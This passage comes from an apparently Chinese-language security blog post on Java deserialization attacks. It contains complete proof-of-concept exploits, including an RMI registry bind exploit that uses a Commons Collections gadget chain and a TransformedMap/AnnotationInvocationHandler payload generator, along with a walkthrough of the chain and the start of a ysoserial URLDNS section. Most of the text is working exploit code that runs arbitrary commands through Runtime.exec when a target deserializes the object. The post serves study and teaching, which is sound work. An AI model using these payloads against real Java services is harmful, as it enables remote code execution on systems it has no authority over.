class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> client;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIexploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 远程 RMI Server 的地址</span></span><br><span class="line">        String ip = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">        <span class="keyword">int</span> port = <span class="number">1099</span>;</span><br><span class="line">        <span class="comment">// 要执行的命令</span></span><br><span class="line">        String command = <span class="string">&quot;calc&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> String ANN_INV_HANDLER_CLASS = <span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造 transformers</span></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123; command &#125;),</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">        <span class="comment">// 构造 chainedtransformer</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// TiedMapEntry 类中调用 Map 类的 get 方法</span></span><br><span class="line">        <span class="comment">// LazyMap 的 get 方法调用 transform</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// BadAttributeValueExpException 重写 readObject 方法，调用输入流的 toString 方法</span></span><br><span class="line">        <span class="comment">// TiremapEntry 的 getValue 方法调用 LazyMap 的 get 方法</span></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        <span class="comment">// 设置 TiedMapEntry</span></span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(badAttributeValueExpException, entry);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 BadAttributeValueExpException 对象封装在 Map 中</span></span><br><span class="line">        String name = <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">        Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        map.put(name, badAttributeValueExpException);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获得 AnnotationInvocationHandler 的构造函数</span></span><br><span class="line">        Constructor cl = Class.forName(ANN_INV_HANDLER_CLASS).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        cl.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 Map 封装到 AnnotationInvocationHandler 中，转换为 Remote 类型</span></span><br><span class="line">        <span class="comment">// 实例化一个代理</span></span><br><span class="line">        InvocationHandler hl = (InvocationHandler)cl.newInstance(Override.class, map);</span><br><span class="line">        Object object = Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[]&#123;Remote.class&#125;, hl);</span><br><span class="line">        Remote remote = Remote.class.cast(object);</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">        registry.bind(name, remote);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><img src="https://i.loli.net/2021/09/16/18OfJbtvEo64U3F.jpg" ><h3 id="Apache-CommonsCollections"><a href="#Apache-CommonsCollections" class="headerlink" title="Apache CommonsCollections"></a>Apache CommonsCollections</h3><blockquote><p>利用 ChainedTransformer 构造恶意代码执行链，反序列化时触发其 transform 方法通过反射调用构造好的恶意代码<br>TransformedMap 修改 key 就会触发调用相应的 transformer.transform<br>动态代理 AnnotationInvocationHandler 在反序列化时对其变量进行设置操作<br>ChainedTransformer 和 AnnotationInvocationHandler 可作为其他 gadget 的“后半”部分</p></blockquote><p>反射机制：在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。</p><p>漏洞成因：InvokerTransformer 类实现的 Transformer 接口，可以通过 Java 反射机制来调用任意函数。</p><p>远程代码执行：Client 构造恶意序列化对象，Server 反序列化触发 <code>readObject</code> 方法，触发构造好的 Transformer 序列，实现代码执行。</p><img src="https://i.loli.net/2021/09/16/43poxMzsqw78rDm.png" ><p>Map 类是存储键值对的数据结构，Apache Commons Collections中实现了类 TransformedMap，用来对 Map 进行某种变换，只要调用 <code>decorate()</code> 函数，传入 key 和 value 的变换函数 Transformer，即可从任意 Map 对象生成相应的 TransformedMap。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line"><span class="keyword">super</span>(map);</span><br><span class="line"><span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line"><span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Transformer 是一个接口，其中定义的 <code>transform()</code> 函数用来将一个对象转换成另一个对象。当 Map 中的任意项的 key 或者 value 被修改，相应的 Transformer 就会被调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Apache Commons Collections 中已经实现了一些常见的 Transformer，其中的 InvokerTransformer 可以通过调用 Java 的反射机制来调用任意函数：</p><ul><li>可控参数 <code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName; <span class="comment">// 方法名称</span></span><br><span class="line">        iParamTypes = paramTypes; <span class="comment">// 参数类型</span></span><br><span class="line">        iArgs = args;  <span class="comment">// 参数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ConstantTransformer 的 <code>transform()</code> 方法，返回 iConstant 属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ChainedTransformer 接受 Transformer 数组，<code>transform</code> 方法循环调用 Transformer 的 transform 方法，并使用前一个 object 作为参数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞利用需要触发 ChainedTransformer 对象的 <code>transform()</code> 函数，而 TransformedMap 的 <code>checkSetValue</code> 函数中就调用了 <code>transform</code> 方法，那么就要通过构造一个 Map 和一个能执行代码的 ChainedTransformer 以此生成 TransformedMap，然后修改 Map 触发 Transformer 调用。</p><p>TransformedMap 中有三个方法调用了 <code>transform()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (keyTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> object;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>动态代理（Dynamic Proxy） AnnotationInvocationHandler 类的 <code>memberValues</code> 是 Map 类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>AnnotationInvocationHandler 的 <code>readObject</code> 函数对 <code>memberValues</code> 的每一项调用 <code>setValue</code> 函数，而该函数会触发 TransformedMap 的 <code>checkSetValue</code> 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 触发 Transformer</span></span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>序列化对象触发代码执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.readObject -&gt; Map.setValue -&gt; TransformedMap.checkSetValue -&gt; ChainedTransformer.transform -&gt; InvokeTransformer.transform -&gt; 代码执行</span><br></pre></td></tr></table></figure><p>POC 示例</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">Reverse_Payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 构造 ChainedTransformer</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123; Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">&quot;open /Applications/Calculator.app&quot;</span> &#125;) &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造 Map</span></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innermap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 构造 TransformedMap</span></span><br><span class="line">        Map outmap = TransformedMap.decorate(innermap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 通过反射获得 AnnotationInvocationHandler 类对象</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="comment">// 通过反射获得 cls 的构造函数</span></span><br><span class="line">        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        <span class="comment">// 设置 Accessible 为 true</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//通过 newInstance() 方法实例化对象</span></span><br><span class="line">        Object instance = ctor.newInstance(Retention.class, outmap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        GeneratePayload(Reverse_Payload(), <span class="string">&quot;obj&quot;</span>);</span><br><span class="line">        payloadTest(<span class="string">&quot;obj&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GeneratePayload</span><span class="params">(Object instance, String file)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 将构造好的 payload 序列化后写入文件中</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(file);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(instance);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">payloadTest</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 读取写入的 payload 并进行反序列化</span></span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h1><div class="note primary flat"><p>建议將 <a href="https://github.com/frohoff/ysoserial">frohoff/ysoserial</a> 克隆下来本地调试，这里也只是翻查了一下利用链而已。</p></div><p>Java 反序列化 RCE 三要素：readobject 利用点、利用链、RCE 触发点</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><blockquote><p>URL 类的对象在比较时会进行 DNS 查询，HashMap 反序列化时会对 key 进行哈希和比较<br>将 URL 类对象作为 HashMap 的 key，同时将其 url 设置为可以查询 DNSLOG 地址，将 HashMap 发送到目标服务器，当服务器反序列该数据时将触发 DNS 查询。</p></blockquote><p>不依赖任何第三方库，可以用于确认 <code>readObject</code> 反序列化利用点存在</p><p>URL 类在比较时（<code>equals</code>、<code>hashCode</code>）会进行 DNS 查询，当两个主机名解析到同一个 ip 时认为它们相等。</p><p>利用链</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject() <span class="comment"># k-v 结构</span></span><br><span class="line">  HashMap.putVal()   <span class="comment"># java.util.HashMap#readObject 反序列化中调用，参数为 hash(key)</span></span><br><span class="line">    HashMap.hash()   <span class="comment"># 计算 key 的哈希值，调用 java.net.URL#hashCode</span></span><br><span class="line">      URL.hashCode() <span class="comment"># 当 hashCode 为 -1 时，调用 java.net.URLStreamHandler#hashCode，内部再调用 getHostAddress </span></span><br></pre></td></tr></table></figure><img 